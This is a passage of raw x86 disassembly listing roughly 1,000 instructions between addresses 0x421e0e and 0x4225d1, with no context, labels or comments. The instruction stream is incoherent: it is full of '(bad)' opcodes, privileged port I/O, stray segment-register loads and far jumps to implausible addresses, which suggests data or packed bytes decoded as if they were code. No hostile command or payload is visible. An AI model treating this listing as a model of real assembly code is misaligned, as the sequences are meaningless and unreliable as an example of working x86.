  421e0e:	mov    ds,WORD PTR [ecx]
  421e10:	cmp    al,0xed
  421e12:	test   DWORD PTR [edx],esp
  421e14:	pop    ebp
  421e15:	(bad)  
  421e16:	int3   
  421e17:	add    bh,BYTE PTR [esi]
  421e19:	fisubr WORD PTR [ebp-0x5]
  421e1c:	lahf   
  421e1d:	mov    eax,0x975e65c
  421e22:	les    ebp,FWORD PTR [edi+0x5a]
  421e25:	sti    
  421e26:	popa   
  421e27:	ror    BYTE PTR [eax],cl
  421e29:	test   eax,0xd711c64e
  421e2e:	sbb    BYTE PTR [esi],bh
  421e30:	sar    DWORD PTR [edi],cl
  421e32:	dec    ebx
  421e33:	jmp    FWORD PTR [ebx+edi*8+0x29]
  421e37:	fsubr  st,st(4)
  421e39:	outs   dx,DWORD PTR ds:[esi]
  421e3a:	sbb    al,0x5c
  421e3c:	pop    ebx
  421e3d:	add    al,0x26
  421e3f:	ds cli 
  421e41:	test   BYTE PTR [edi+0x4f792bfd],dh
  421e47:	call   0xd68562b6
  421e4c:	add    ebx,esp
  421e4e:	inc    ebp
  421e4f:	cdq    
  421e50:	dec    ecx
  421e51:	dec    esp
  421e52:	stc    
  421e53:	fbld   TBYTE PTR [edx+0x5949fbfe]
  421e59:	mov    esi,0xce011c2b
  421e5e:	fs repnz in al,dx
  421e61:	jmp    0x421df3
  421e63:	cs mov cl,0x58
  421e66:	add    al,0x3b
  421e68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e69:	push   esi
  421e6a:	mov    edi,esp
  421e6c:	inc    edx
  421e6d:	sbb    eax,0xbe2c62c2
  421e72:	or     DWORD PTR [edi],edi
  421e74:	dec    esi
  421e75:	pop    es
  421e76:	push   esp
  421e77:	icebp  
  421e78:	les    edx,FWORD PTR [edi]
  421e7a:	pusha  
  421e7b:	shl    BYTE PTR [eax-0x4f],1
  421e7e:	jge    0x421ed5
  421e80:	push   ebx
  421e81:	call   0xc55d1851
  421e86:	daa    
  421e87:	mov    ecx,0x69cc912d
  421e8c:	push   esi
  421e8d:	sbb    BYTE PTR ds:0xc2ca7a66,ah
  421e93:	imul   edx,DWORD PTR [esi-0x4b],0x3d
  421e97:	add    cl,BYTE PTR ds:0x66889fe0
  421e9d:	pop    ebx
  421e9e:	pop    esi
  421e9f:	enter  0xa395,0x6e
  421ea3:	test   BYTE PTR [ebx+0x7ed84234],al
  421ea9:	lods   al,BYTE PTR ds:[esi]
  421eaa:	fcomp  DWORD PTR [esi+0x1518d568]
  421eb0:	shl    bh,1
  421eb2:	js     0x421edf
  421eb4:	xchg   ecx,eax
  421eb5:	push   eax
  421eb6:	dec    edi
  421eb7:	test   DWORD PTR [esi-0x66d9813b],ecx
  421ebd:	mov    cl,0xfa
  421ebf:	(bad)  
  421ec0:	stc    
  421ec1:	cld    
  421ec2:	mov    cl,0xe2
  421ec4:	data16 or BYTE PTR [ebx+0x7e22b0ff],0xf1
  421ecc:	jmp    0x9c92d2b1
  421ed1:	cld    
  421ed2:	dec    edi
  421ed3:	repnz fwait
  421ed5:	inc    ebx
  421ed6:	xchg   edi,eax
  421ed7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ed8:	bound  ebx,QWORD PTR [ebx+ecx*2-0x68cb42f6]
  421edf:	gs aas 
  421ee1:	mov    dl,0x1b
  421ee3:	push   cs
  421ee4:	int    0xaf
  421ee6:	(bad)  
  421ee7:	into   
  421ee8:	mov    esi,0xf17593e7
  421eed:	fldenv [ecx+0x52893ac3]
  421ef3:	mov    gs:0x484701c0,eax
  421ef9:	push   ebx
  421efa:	xor    eax,0xe62590fc
  421eff:	mov    fs,eax
  421f01:	test   DWORD PTR [esi+0x6d],ebx
  421f04:	out    dx,eax
  421f05:	fs mov cl,0x80
  421f08:	mov    ds:0x6fdd8741,eax
  421f0d:	out    dx,al
  421f0e:	pop    ss
  421f0f:	add    ch,BYTE PTR [ecx+0x50]
  421f12:	int    0x75
  421f14:	push   es
  421f15:	int    0x31
  421f17:	add    ecx,DWORD PTR [ecx+0x4]
  421f1a:	xor    ecx,DWORD PTR [eax-0xe]
  421f1d:	ss xchg esp,eax
  421f1f:	pushf  
  421f20:	test   eax,0x835ac6f9
  421f25:	cdq    
  421f26:	adc    bl,BYTE PTR ds:0x34b71091
  421f2c:	xor    BYTE PTR [edi+0x7d],bh
  421f2f:	std    
  421f30:	dec    edx
  421f31:	inc    eax
  421f32:	scas   eax,DWORD PTR es:[edi]
  421f33:	cs mov esp,0x46cb7bb9
  421f39:	xchg   edi,eax
  421f3a:	mov    ch,0x10
  421f3c:	xor    DWORD PTR [edi-0x2fa41ad0],ebp
  421f42:	adc    ch,BYTE PTR [edx]
  421f44:	mov    esi,0x63768c8f
  421f49:	aaa    
  421f4a:	ja     0x421f5f
  421f4c:	sbb    edi,edx
  421f4e:	sar    BYTE PTR [eax-0xd],0xe1
  421f52:	stos   BYTE PTR es:[edi],al
  421f53:	ret    0xe246
  421f56:	clc    
  421f57:	mov    esp,0xf6b4e23
  421f5c:	push   0xcb228473
  421f61:	inc    eax
  421f62:	(bad)  
  421f63:	xlat   BYTE PTR ds:[ebx]
  421f64:	sbb    BYTE PTR [edx+0x18],al
  421f67:	outs   dx,BYTE PTR ds:[esi]
  421f68:	jecxz  0x421f58
  421f6a:	xchg   ecx,eax
  421f6b:	jecxz  0x421f5a
  421f6d:	pop    ss
  421f6e:	daa    
  421f6f:	cmp    ecx,DWORD PTR [esi-0xd]
  421f72:	ficomp DWORD PTR [esi]
  421f74:	fimul  DWORD PTR [ecx+0x5c331d8f]
  421f7a:	xchg   ebx,eax
  421f7b:	aam    0x5
  421f7d:	out    dx,al
  421f7e:	mov    BYTE PTR [esi-0x5a],ch
  421f81:	sub    DWORD PTR [edi+0x27],esi
  421f84:	icebp  
  421f85:	(bad)  
  421f86:	mov    bl,0xe2
  421f88:	lods   eax,DWORD PTR ds:[esi]
  421f89:	icebp  
  421f8a:	cmp    ebx,DWORD PTR ds:0x68358737
  421f90:	mov    al,ds:0xffd855f6
  421f95:	jbe    0x42200d
  421f97:	aaa    
  421f98:	enter  0x74c5,0x30
  421f9c:	pushf  
  421f9d:	or     ah,dh
  421f9f:	in     eax,dx
  421fa0:	fmul   QWORD PTR [eax]
  421fa2:	jb     0x421f6f
  421fa4:	mov    edx,0x38582108
  421fa9:	pop    esi
  421faa:	sub    al,0x95
  421fac:	mov    eax,cs:0xa5217210
  421fb2:	jb     0x422032
  421fb4:	xchg   ecx,eax
  421fb5:	addr16 sub al,0xbf
  421fb8:	adc    DWORD PTR [edi-0x4388cd12],esp
  421fbe:	inc    esi
  421fbf:	(bad)  
  421fc0:	mov    ?,WORD PTR [eax]
  421fc2:	mov    al,ds:0xc5b4b573
  421fc7:	clc    
  421fc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fc9:	mov    bh,0xaa
  421fcb:	das    
  421fcc:	xor    BYTE PTR [eax],0xf6
  421fcf:	pushf  
  421fd0:	fwait
  421fd1:	scas   eax,DWORD PTR es:[edi]
  421fd2:	or     cl,dl
  421fd4:	in     eax,dx
  421fd5:	lods   al,BYTE PTR ds:[esi]
  421fd6:	cld    
  421fd7:	or     bh,cl
  421fd9:	test   DWORD PTR [ecx+0x2edbc321],eax
  421fdf:	scas   al,BYTE PTR es:[edi]
  421fe0:	push   0x4b38c651
  421fe5:	pushf  
  421fe6:	jbe    0x421fcd
  421fe8:	or     DWORD PTR [ebx+0x3a807927],0xffffff96
  421fef:	and    esp,DWORD PTR [ebx-0xe]
  421ff2:	aaa    
  421ff3:	fadd   DWORD PTR [eax]
  421ff5:	test   al,0x62
  421ff7:	xchg   ebp,eax
  421ff8:	sub    DWORD PTR [edx],edi
  421ffa:	mov    ds:0xa7ff4cd,al
  421fff:	(bad)  
  422000:	mov    dl,0xb4
  422002:	inc    edi
  422003:	jmp    DWORD PTR [edi]
  422005:	mov    esp,esp
  422007:	mov    cl,0x1f
  422009:	je     0x42200a
  42200b:	loope  0x421ff1
  42200d:	mov    ecx,eax
  42200f:	mov    bh,0xcc
  422011:	(bad)  
  422012:	bound  esi,QWORD PTR [edx+0x751a885b]
  422018:	out    0x8f,al
  42201a:	mov    ds:0xe9803fb2,al
  42201f:	mov    ds:0xeb1a3e93,al
  422024:	repz or al,0xa7
  422027:	int3   
  422028:	cld    
  422029:	mov    dl,0x83
  42202b:	leave  
  42202c:	pop    ebp
  42202d:	mov    DWORD PTR [ebx-0x400e0b10],0x484bf810
  422037:	adc    al,0xc5
  422039:	lahf   
  42203a:	mov    eax,ds:0x60604c42
  42203f:	and    ah,dl
  422041:	dec    eax
  422042:	and    BYTE PTR [esi],dl
  422044:	sub    al,0xd5
  422046:	pop    es
  422047:	fisubr DWORD PTR [eax+0xabcc698]
  42204d:	xchg   edi,eax
  42204e:	mov    ah,0xd
  422050:	aas    
  422051:	sub    eax,0xe4a5f6fd
  422056:	popa   
  422057:	jl     0x421fe5
  422059:	fwait
  42205a:	mov    bh,0x59
  42205c:	inc    ebp
  42205d:	adc    BYTE PTR [eax+0x26ec7cd1],0x48
  422064:	or     BYTE PTR [ebx+0x29],bl
  422067:	sbb    BYTE PTR [ebx+edi*8-0x5b],dl
  42206b:	ss ret 
  42206d:	jg     0x421ffc
  42206f:	loope  0x422056
  422071:	aam    0xab
  422073:	cld    
  422074:	add    DWORD PTR [edx-0x62],ecx
  422077:	daa    
  422078:	pop    ebp
  422079:	xchg   edx,ebp
  42207b:	daa    
  42207c:	jge    0x422069
  42207e:	push   ecx
  42207f:	push   edx
  422080:	call   0x7501b9d6
  422085:	sub    BYTE PTR [ecx-0x4bcc055f],ch
  42208b:	sahf   
  42208c:	xor    BYTE PTR [edx+0x22],bl
  42208f:	into   
  422090:	mov    al,0x6e
  422092:	sub    edx,eax
  422094:	icebp  
  422095:	stc    
  422096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422097:	xor    BYTE PTR [ebx+0x6a],cl
  42209a:	push   ss
  42209b:	leave  
  42209c:	shl    BYTE PTR ds:0x2ce58bbb,1
  4220a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220a3:	adc    dl,BYTE PTR [edx+0x35]
  4220a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220a7:	pop    ds
  4220a8:	pop    ds
  4220a9:	mov    ds:0x60bddded,al
  4220ae:	mov    edx,0x60b78c73
  4220b3:	sub    DWORD PTR [ecx+edx*8+0x4e],edi
  4220b7:	ja     0x422055
  4220b9:	xor    eax,0x39a012a9
  4220be:	jmp    0x5a68652f
  4220c3:	pop    edi
  4220c4:	jl     0x4220c1
  4220c6:	arpl   WORD PTR [edx-0x50],sp
  4220c9:	cmp    BYTE PTR [edx],dl
  4220cb:	fdivr  DWORD PTR [ecx]
  4220cd:	in     eax,dx
  4220ce:	rcl    BYTE PTR ds:0xb8b33809,0xad
  4220d5:	lods   al,BYTE PTR ds:[esi]
  4220d6:	mov    ebx,0x20815a88
  4220db:	xor    BYTE PTR [edi],al
  4220dd:	or     al,0xec
  4220df:	xor    eax,DWORD PTR [eax+0x75]
  4220e2:	std    
  4220e3:	mov    dh,BYTE PTR [esi]
  4220e5:	gs cmp bl,bl
  4220e8:	push   esi
  4220e9:	mov    dh,0x63
  4220eb:	xor    DWORD PTR [ebx-0x53],eax
  4220ee:	shl    DWORD PTR [bp+si-0x5dfa],0xcb
  4220f4:	mov    ?,WORD PTR [eax+0x21d49145]
  4220fa:	(bad)  
  4220fb:	icebp  
  4220fc:	mov    ch,0xaa
  4220fe:	les    eax,FWORD PTR [edi+0x27352b38]
  422104:	shl    ah,1
  422106:	add    DWORD PTR [edx+esi*2+0x4e],ebp
  42210a:	mov    dl,0xc0
  42210c:	hlt    
  42210d:	adc    DWORD PTR [esi+ecx*8],0xa4db56ff
  422114:	mov    ds:0x1dc91012,eax
  422119:	mov    BYTE PTR [edi-0x1909479d],ah
  42211f:	outs   dx,BYTE PTR ds:[esi]
  422120:	pop    es
  422121:	out    0x2b,eax
  422123:	jmp    DWORD PTR [esi]
  422125:	xor    al,0xd2
  422127:	(bad)  
  422128:	neg    DWORD PTR [ebx+0x6b]
  42212b:	call   FWORD PTR [eax-0x56a3349c]
  422131:	cwde   
  422132:	repz cdq 
  422134:	cwde   
  422135:	(bad)  
  422136:	dec    eax
  422137:	inc    edx
  422138:	ins    BYTE PTR es:[edi],dx
  422139:	xor    eax,0xecef279b
  42213e:	inc    ebx
  42213f:	push   es
  422140:	mov    al,ds:0xb5b3f727
  422145:	sub    eax,esp
  422147:	xchg   edi,eax
  422148:	push   edx
  422149:	jbe    0x4221c9
  42214b:	xchg   BYTE PTR [ebx+0x2f3673da],bh
  422151:	ror    BYTE PTR [ecx],cl
  422153:	(bad)  
  422154:	jmp    0x422160
  422156:	push   esi
  422157:	shl    BYTE PTR [esi-0x69],1
  42215a:	mov    bl,0x9a
  42215c:	dec    edx
  42215d:	lds    esp,FWORD PTR [eax]
  42215f:	clc    
  422160:	sti    
  422161:	adc    eax,0xfe1c0dfd
  422166:	jns    0x4220f8
  422168:	mov    ebx,es
  42216a:	dec    edx
  42216b:	ds test eax,0xb2b3555e
  422171:	cmp    BYTE PTR [ecx+0x5a],0x2
  422175:	xchg   ecx,eax
  422176:	out    0x30,al
  422178:	jmp    0x90536b37
  42217d:	enter  0xd70e,0x20
  422181:	ins    DWORD PTR es:[edi],dx
  422182:	sub    dh,ch
  422184:	mov    esp,0xb49bb43c
  422189:	(bad)  
  42218a:	lea    ecx,[edx-0x6]
  42218d:	jne    0x422119
  42218f:	dec    eax
  422190:	push   eax
  422191:	and    BYTE PTR [ebx+0x5283bddb],0x58
  422198:	paddusb mm0,QWORD PTR [ebp-0x9]
  42219c:	push   edi
  42219d:	sbb    al,0x75
  42219f:	xor    eax,0x89a81a37
  4221a4:	nop
  4221a5:	inc    ebx
  4221a6:	pop    edx
  4221a7:	and    BYTE PTR [ebx+esi*8+0x7d],bl
  4221ab:	mov    dh,0x96
  4221ad:	es enter 0xf8bc,0xa4
  4221b2:	sub    edi,eax
  4221b4:	sub    cl,BYTE PTR [ecx-0x7ad97b07]
  4221ba:	loop   0x422232
  4221bc:	cwde   
  4221bd:	and    BYTE PTR [esi+0x69],ch
  4221c0:	ins    DWORD PTR es:[edi],dx
  4221c1:	cli    
  4221c2:	sti    
  4221c3:	(bad)  
  4221c4:	addr16 mov ebp,0x29ec94f
  4221ca:	lock test DWORD PTR [ebx+edi*1+0xd],edx
  4221cf:	xchg   BYTE PTR [eax+0x31],bh
  4221d2:	ins    BYTE PTR es:[edi],dx
  4221d3:	das    
  4221d4:	sbb    cl,bl
  4221d6:	mov    ah,0x6f
  4221d8:	push   esp
  4221d9:	sahf   
  4221da:	mov    ebx,0x8df50e25
  4221df:	cmp    BYTE PTR [ecx+0x690d1bd2],cl
  4221e5:	bound  edi,QWORD PTR [esi-0x58e02260]
  4221eb:	shl    BYTE PTR [ebx-0x51],0xad
  4221ef:	ja     0x422261
  4221f1:	push   ebp
  4221f2:	pusha  
  4221f3:	cmp    eax,0x522c0038
  4221f8:	xor    BYTE PTR [ebp+0x2a2e1766],0x92
  4221ff:	inc    esi
  422200:	dec    esi
  422201:	fcomp  QWORD PTR [ecx-0x59fdc1be]
  422207:	dec    edi
  422208:	fucomi st,st(5)
  42220a:	test   al,0xcd
  42220c:	sub    al,0x3d
  42220e:	and    esp,ecx
  422210:	lods   al,BYTE PTR ds:[esi]
  422211:	in     eax,dx
  422212:	repnz mov edx,0x2b47c54e
  422218:	mov    bh,0xeb
  42221a:	les    ebx,FWORD PTR [edi-0x78]
  42221d:	ins    BYTE PTR es:[edi],dx
  42221e:	cmp    esp,DWORD PTR [edx]
  422220:	aas    
  422221:	pop    ebx
  422222:	fld    DWORD PTR [edi+0x783f43fb]
  422228:	inc    esi
  422229:	fadd   DWORD PTR [ebx]
  42222b:	push   ecx
  42222c:	cwde   
  42222d:	sub    ah,dh
  42222f:	mov    ds:0x86ffe861,al
  422234:	mov    edx,0x35eb535c
  422239:	or     al,0xc5
  42223b:	mov    eax,ds:0xed93177
  422240:	scas   al,BYTE PTR es:[edi]
  422241:	lock arpl WORD PTR [edi-0x4b],di
  422245:	push   es
  422246:	or     al,0xa9
  422248:	mov    bh,0x5f
  42224a:	and    eax,0xea7e5d79
  42224f:	je     0x4221d6
  422251:	mov    edx,0xfb6bd64c
  422256:	mov    ds:0xdfcec70b,eax
  42225b:	jnp    0x42221c
  42225d:	add    ebx,DWORD PTR [ebx-0x25]
  422260:	or     eax,0x24599e26
  422265:	add    DWORD PTR [edx+eax*2+0x3df5acd4],ecx
  42226c:	(bad)
  422270:	pop    esi
  422271:	div    dh
  422273:	popa   
  422274:	jo     0x422202
  422276:	jge    0x4222c6
  422278:	into   
  422279:	sub    BYTE PTR ss:[ebp+0x44],cl
  42227d:	add    ch,cl
  42227f:	inc    ecx
  422280:	xor    eax,0x5ef56a49
  422285:	aam    0xe6
  422287:	(bad)  
  422288:	fidivr WORD PTR [edx-0x53]
  42228b:	sbb    al,dh
  42228d:	mov    bl,0x81
  42228f:	fnsave [esi+0x6a]
  422292:	cmp    ch,0x87
  422295:	sub    eax,0x7b6ed7ea
  42229a:	ss ret 0x3a18
  42229e:	in     al,0x11
  4222a0:	dec    edx
  4222a1:	or     DWORD PTR [ecx+edx*4+0x0],esi
  4222a5:	add    BYTE PTR [eax],al
  4222a7:	add    BYTE PTR [eax],al
  4222a9:	add    BYTE PTR [edx+0x44],al
  4222ac:	inc    ebx
  4222ad:	push   edi
  4222ae:	inc    edi
  4222af:	push   edi
  4222b0:	push   esi
  4222b1:	push   ebp
  4222b2:	outs   dx,DWORD PTR ds:[esi]
  4222b3:	pop    ebp
  4222b4:	mov    ds:0x1bd07dc,eax
  4222b9:	xor    DWORD PTR [eax-0x4f],esp
  4222bc:	add    DWORD PTR [eax],eax
  4222be:	add    BYTE PTR [esi],0x0
  4222c1:	add    BYTE PTR ds:0x425886e7,ah
  4222c7:	jb     0x422279
  4222c9:	shl    DWORD PTR [ebx],1
  4222cb:	xchg   ecx,eax
  4222cc:	and    al,0x3a
  4222ce:	aas    
  4222cf:	jecxz  0x42228b
  4222d1:	and    al,0x82
  4222d3:	dec    eax
  4222d4:	test   DWORD PTR [esi+0x47],0xe25f8dfc
  4222db:	loope  0x422283
  4222dd:	out    0xae,al
  4222df:	mov    ch,0x57
  4222e1:	mov    ah,0xee
  4222e3:	xor    al,0x72
  4222e5:	test   eax,0xdcb2e794
  4222ea:	inc    eax
  4222eb:	cmp    DWORD PTR [eax-0x3d19e299],ebx
  4222f1:	ins    BYTE PTR es:[edi],dx
  4222f2:	pop    ecx
  4222f3:	add    DWORD PTR [eax],ecx
  4222f5:	stos   DWORD PTR es:[edi],eax
  4222f6:	(bad)
  4222f9:	dec    esi
  4222fa:	in     al,dx
  4222fb:	arpl   WORD PTR [edi+0x15],bx
  4222fe:	or     edx,esi
  422300:	push   edx
  422301:	or     al,0xf8
  422303:	or     bh,cl
  422305:	cmp    dh,BYTE PTR [eax-0x6fa44e7e]
  42230b:	mov    bl,0xa5
  42230d:	sbb    eax,0x26513132
  422312:	or     BYTE PTR [eax-0x56],ch
  422315:	dec    edx
  422316:	sbb    BYTE PTR [esi+eiz*8-0x3d70a5db],ch
  42231d:	call   FWORD PTR [ebx+ebp*1-0x3250992c]
  422324:	jge    0x4222cc
  422326:	sbb    ch,BYTE PTR [edi-0x174419d9]
  42232c:	adc    BYTE PTR [ebx],dl
  42232e:	pavgw  mm2,QWORD PTR [edi-0x74907420]
  422335:	test   al,0x2b
  422337:	jmp    0x42237b
  422339:	jo     0x422327
  42233b:	mov    ebp,0x5a01bffe
  422340:	out    dx,al
  422341:	jae    0x422354
  422343:	leave  
  422344:	iret   
  422345:	and    eax,0x6134c819
  42234a:	pop    ss
  42234b:	aas    
  42234c:	stos   BYTE PTR es:[edi],al
  42234d:	pop    edx
  42234e:	dec    edx
  42234f:	mov    ebp,0xd57641d2
  422354:	loopne 0x422330
  422356:	std    
  422357:	gs in  al,0x56
  42235a:	mov    bh,0x56
  42235c:	(bad)  
  42235d:	xchg   esi,eax
  42235e:	out    0xb4,eax
  422360:	cmp    edi,DWORD PTR [eax]
  422362:	add    esi,0xffffffab
  422365:	repnz out 0xd4,eax
  422368:	hlt    
  422369:	les    ebx,FWORD PTR [eax-0x52fa3da2]
  42236f:	sub    DWORD PTR [edi-0x2903a1b3],esp
  422375:	mov    ds:0xe20cdc3e,eax
  42237a:	call   0x16b9:0x4823781a
  422381:	and    eax,0x57334fe6
  422386:	push   es
  422387:	sub    ebx,eax
  422389:	xchg   ebx,eax
  42238a:	ds pop ds
  42238c:	jge    0x422377
  42238e:	cmp    edx,esi
  422390:	xor    DWORD PTR [edi+eiz*8-0x5],eax
  422394:	xchg   esi,eax
  422395:	xor    ecx,esi
  422397:	(bad)  
  422398:	mov    ds:0xbd517515,al
  42239d:	ror    BYTE PTR ds:0x6aa2960e,1
  4223a3:	add    eax,esp
  4223a5:	rol    DWORD PTR [eax+esi*4+0x54],cl
  4223a9:	jmp    0x422349
  4223ab:	push   0x23
  4223ad:	push   eax
  4223ae:	popa   
  4223af:	mov    eax,DWORD PTR [ebp+edi*8-0x5ffde30a]
  4223b6:	mov    dl,0xe1
  4223b8:	ds (bad) 
  4223ba:	retf   
  4223bb:	test   al,0x3
  4223bd:	adc    al,0x4f
  4223bf:	push   esp
  4223c0:	jg     0x4223a4
  4223c2:	aam    0x25
  4223c4:	mov    esp,DWORD PTR [ebp-0x1baea0c]
  4223ca:	xchg   edx,eax
  4223cb:	mov    es,WORD PTR [ebp+ebp*4-0x72]
  4223cf:	mov    esp,0x85dfcb29
  4223d4:	cmc    
  4223d5:	data16 daa 
  4223d7:	scas   al,BYTE PTR es:[edi]
  4223d8:	pop    ds
  4223d9:	imul   edi,DWORD PTR ds:0xef8ddb9c,0x5f
  4223e0:	out    0xf0,al
  4223e2:	in     al,0x21
  4223e4:	cmp    DWORD PTR [ebx+eax*4],edi
  4223e7:	js     0x4223f9
  4223e9:	in     al,0xe7
  4223eb:	sbb    al,0x10
  4223ed:	iret   
  4223ee:	gs push esp
  4223f0:	dec    esp
  4223f1:	xor    bl,BYTE PTR [edx]
  4223f3:	xor    cl,ah
  4223f5:	mov    eax,es
  4223f7:	adc    ebp,DWORD PTR [eax+esi*2]
  4223fa:	xchg   DWORD PTR [ebx-0x4],esi
  4223fd:	xor    al,0xa7
  4223ff:	dec    edi
  422400:	pusha  
  422401:	adc    DWORD PTR [ebx-0xd5d5505],0xffffffcd
  422408:	adc    BYTE PTR [edi-0x5e],ah
  42240b:	ins    BYTE PTR es:[edi],dx
  42240c:	cli    
  42240d:	out    0xeb,al
  42240f:	pop    esi
  422410:	(bad)
  422413:	sbb    eax,0x30f595bb
  422418:	cs mov bl,0x74
  42241b:	inc    esp
  42241c:	jno    0x4223f7
  42241e:	bound  esp,QWORD PTR [ecx]
  422420:	ret    
  422421:	pop    edi
  422422:	add    al,0x9b
  422424:	jne    0x422490
  422426:	outs   dx,BYTE PTR ds:[esi]
  422427:	(bad)  
  422428:	into   
  422429:	xchg   ebp,eax
  42242a:	test   BYTE PTR [ebx-0x30],ah
  42242d:	das    
  42242e:	push   cs
  42242f:	sahf   
  422430:	sar    DWORD PTR [esi],cl
  422432:	addr16 mov bh,0x5c
  422435:	loopne 0x4223c0
  422437:	pop    ss
  422438:	outs   dx,DWORD PTR ds:[esi]
  422439:	pop    ds
  42243a:	popa   
  42243b:	inc    edx
  42243c:	mov    cl,0xdd
  42243e:	xchg   ecx,eax
  42243f:	int3   
  422440:	loope  0x42244f
  422442:	push   edi
  422443:	add    eax,0x5c855b1
  422448:	dec    ecx
  422449:	inc    ebp
  42244a:	jmp    0x4224ba
  42244c:	adc    eax,0x4241705e
  422451:	je     0x422444
  422453:	xchg   edi,eax
  422454:	jbe    0x42243c
  422456:	push   ss
  422457:	pop    ss
  422458:	cmp    eax,0xfdf26684
  42245d:	adc    al,0xbf
  42245f:	sub    eax,0xb03b209d
  422464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422465:	xchg   esi,eax
  422466:	ret    0x7919
  422469:	stos   BYTE PTR es:[edi],al
  42246a:	mov    ebp,0x6288ab1a
  42246f:	jecxz  0x4224c1
  422471:	pushf  
  422472:	fst    st(0)
  422474:	aad    0x64
  422476:	adc    dl,BYTE PTR [ebx+0x12]
  422479:	xor    BYTE PTR [esi],bh
  42247b:	push   es
  42247c:	sar    BYTE PTR [ebx-0x4f2dc8d3],cl
  422482:	mov    cl,0x5f
  422484:	mov    edi,0x4ae75341
  422489:	xchg   edi,eax
  42248a:	cld    
  42248b:	dec    esi
  42248c:	sub    DWORD PTR [eax-0x66230bf9],edx
  422492:	scas   eax,DWORD PTR es:[edi]
  422493:	in     eax,0xd5
  422495:	cwde   
  422496:	mov    WORD PTR [edi+0x5eb86320],es
  42249c:	sbb    DWORD PTR [ecx-0x5b],edi
  42249f:	rcr    BYTE PTR [edi],cl
  4224a1:	xor    al,0x33
  4224a3:	adc    bh,BYTE PTR [ebx]
  4224a5:	xor    eax,0xd2df27f5
  4224aa:	inc    ecx
  4224ab:	mov    eax,ds:0xa1c570d0
  4224b0:	mov    dl,0x2c
  4224b2:	mov    edx,0xc94e1f1
  4224b7:	mov    al,ds:0xc0dd22c7
  4224bc:	(bad)
  4224c0:	dec    ecx
  4224c1:	adc    al,al
  4224c3:	and    eax,0xd3c00301
  4224c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c9:	iret   
  4224ca:	xchg   esi,eax
  4224cb:	enter  0x2d5d,0xde
  4224cf:	hlt    
  4224d0:	mov    ds:0x623e7291,eax
  4224d5:	dec    eax
  4224d6:	nop
  4224d7:	pop    eax
  4224d8:	scas   al,BYTE PTR es:[edi]
  4224d9:	shl    BYTE PTR [edx-0x4417b41a],cl
  4224df:	outs   dx,DWORD PTR ds:[esi]
  4224e0:	sbb    al,0xf0
  4224e2:	test   edi,ebp
  4224e4:	cld    
  4224e5:	out    dx,al
  4224e6:	mov    al,0x64
  4224e8:	sbb    ebp,eax
  4224ea:	mov    edi,0xdc3f8a8c
  4224ef:	aas    
  4224f0:	xchg   ebx,eax
  4224f1:	mov    esi,0x3b4bdca7
  4224f6:	in     al,0xd2
  4224f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224f9:	test   esp,ecx
  4224fb:	adc    dl,BYTE PTR [esi]
  4224fd:	push   0x53
  4224ff:	mov    edx,0xbb0afe8f
  422504:	or     eax,0x24fbf291
  422509:	imul   edi,DWORD PTR [ebx+0x523e5b52],0xffffff86
  422510:	test   ebp,eax
  422512:	push   ecx
  422513:	repz jbe 0x422555
  422516:	xchg   ebx,eax
  422517:	and    DWORD PTR [ebx],edi
  422519:	push   es
  42251a:	fld    TBYTE PTR [eax]
  42251c:	adc    DWORD PTR [edx-0x3ac85dc0],edi
  422522:	dec    edi
  422523:	jge    0x4224b5
  422525:	push   esp
  422526:	or     eax,DWORD PTR [ebp-0x612231fd]
  42252c:	jbe    0x42250a
  42252e:	(bad)  
  42252f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422530:	stos   BYTE PTR es:[edi],al
  422531:	in     eax,0xa0
  422533:	aam    0x45
  422535:	stos   BYTE PTR es:[edi],al
  422536:	adc    bh,BYTE PTR [ebx-0x52410d5b]
  42253c:	call   0x614a8ca9
  422541:	gs loop 0x422594
  422544:	mov    ds:0x726bbe48,al
  422549:	push   esp
  42254a:	stc    
  42254b:	shr    DWORD PTR [ecx+0x13663353],cl
  422551:	inc    esi
  422552:	sub    BYTE PTR [esi],ah
  422554:	rol    DWORD PTR [edx+0x778da46a],cl
  42255a:	jnp    0x422539
  42255c:	mov    eax,0x2eaba9bb
  422561:	dec    edx
  422562:	mov    eax,ds:0xe450d75e
  422567:	(bad)  [esi+0x37]
  42256a:	test   al,0xec
  42256c:	cmp    bl,BYTE PTR [edx-0x26]
  42256f:	loope  0x4225d7
  422571:	sub    al,0x3b
  422573:	arpl   WORD PTR fs:[ebp-0x68],dx
  422577:	pop    ecx
  422578:	enter  0x664b,0x20
  42257c:	es int3 
  42257e:	ja     0x422570
  422580:	loopne 0x422516
  422582:	xor    BYTE PTR [esp+eiz*4+0x1d012bfd],al
  422589:	(bad)  
  42258a:	push   es
  42258b:	jmp    0x42259a
  42258d:	xor    bh,BYTE PTR ds:0x979e4ec4
  422593:	cld    
  422594:	sbb    al,0xef
  422596:	xor    DWORD PTR [eax-0x77],ebp
  422599:	jmp    0x1ced:0xf933326c
  4225a0:	mov    BYTE PTR [edi],dh
  4225a2:	rol    ch,cl
  4225a4:	iret   
  4225a5:	fwait
  4225a6:	jecxz  0x4225d9
  4225a8:	jns    0x4225ee
  4225aa:	bound  esp,QWORD PTR [edi-0x78]
  4225ad:	cmp    cl,BYTE PTR [ecx]
  4225af:	test   edx,ecx
  4225b1:	sub    al,0x85
  4225b3:	and    BYTE PTR [ebx+ebx*8],0x66
  4225b7:	xor    BYTE PTR fs:[ebx],dl
  4225ba:	sbb    ah,BYTE PTR ds:0x91822570
  4225c0:	inc    ebx
  4225c1:	ins    DWORD PTR es:[edi],dx
  4225c2:	pushf  
  4225c3:	pop    ecx
  4225c4:	xchg   ebx,eax
  4225c5:	fcomp  QWORD PTR [eax-0x34]
  4225c8:	or     dl,BYTE PTR [ebx+0x63]
  4225cb:	inc    esp
  4225cc:	scas   eax,DWORD PTR es:[edi]
  4225cd:	or     DWORD PTR [ebx-0x17],esi
  4225d0:	fwait
  4225d1:	mov    ecx,0x7159a2a7
